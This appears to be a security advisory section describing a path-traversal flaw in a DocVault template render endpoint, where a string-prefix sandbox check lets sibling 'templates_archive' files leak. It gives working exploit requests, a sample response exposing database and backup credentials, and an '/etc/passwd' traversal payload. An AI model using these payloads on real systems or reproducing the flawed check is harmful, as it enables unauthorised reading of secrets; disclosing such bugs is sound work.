# Attack Vector

## Endpoint

```
GET /api/v1/templates/render?name=<NAME>&locale=<LOCALE>
```

Both parameters are reachable by any authenticated tenant. No special
role, scope, or admin token is required — the same level of access
needed to render an ordinary invoice is enough to exploit the bug.

## Concrete exploit request

```
GET /api/v1/templates/render
    ?name=invoice
    &locale=../../templates_archive/retention/2024/q3/locale_snapshot.preprod
```

## Response on the vulnerable build

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!-- DOCVAULT INTERNAL - retained render snapshot, never tenant-facing -->
<!-- ROOT_DB_DSN=postgresql://docvault_admin:correct-horse-battery@db.internal:5432/docvault -->
<!-- BACKUP_BUCKET_KEY=AKIA-INTERNAL-DOCVAULT-BACKUPS-DO-NOT-EXPOSE -->
<html><body>retained locale snapshot</body></html>
```

## Step-by-step path resolution

| Stage | Value |
| ----- | ----- |
| Composed path  | `/app/data/templates/invoice/../../templates_archive/retention/2024/q3/locale_snapshot.preprod.html` |
| After `normpath` + `abspath` | `/app/data/templates_archive/retention/2024/q3/locale_snapshot.preprod.html` |
| Sandbox root   | `/app/data/templates`                                                 |
| `startswith` result | `True`  ← the prefix `/app/data/templates` matches the literal first 18 characters of the candidate |
| FileLoader     | reads and returns archive bytes                                       |
| Handler        | wraps in `200 OK` HTML response                                       |

## Variants

The same vector works against any file in any sibling directory whose
name starts with `templates`. In the shipped fixture tree:

- `?name=invoice&locale=../../templates_archive/retention/2024/q3/locale_snapshot.preprod`
  -> leaks `locale_snapshot.preprod.html`
- `?name=welcome&locale=../../templates_archive/retention/2021/q4/invoice_migration_v1.mailer`
  -> leaks `invoice_migration_v1.mailer.html` (contains internal SMTP password)

The choice of `name` is irrelevant — any registered template name works
because the `..` segments traverse out of the `<name>/` subdirectory.

## Why the obvious traversal does NOT work

The naive payload `locale=../../../../etc/passwd` resolves to
`/etc/passwd`, which does **not** share the textual prefix
`/app/data/templates`. The vulnerable predicate correctly rejects it.
The exploit only works for sibling directories that happen to share
the textual prefix — which is precisely why the bug evades both the
existing tests and a casual code review.

## Impact (CVSS:3.1)

```
Vector : AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Score  : 6.5  (Medium)
```

- **Confidentiality:** HIGH — arbitrary read of any file under any
  sibling directory whose name starts with `templates`. In a real
  deployment those directories typically hold backups, audit logs,
  and credential snapshots.
- **Integrity:**     NONE — read-only.
- **Availability:**  NONE.
- **Privilege:**     LOW — ordinary tenant token.
- **User interaction:** NONE.
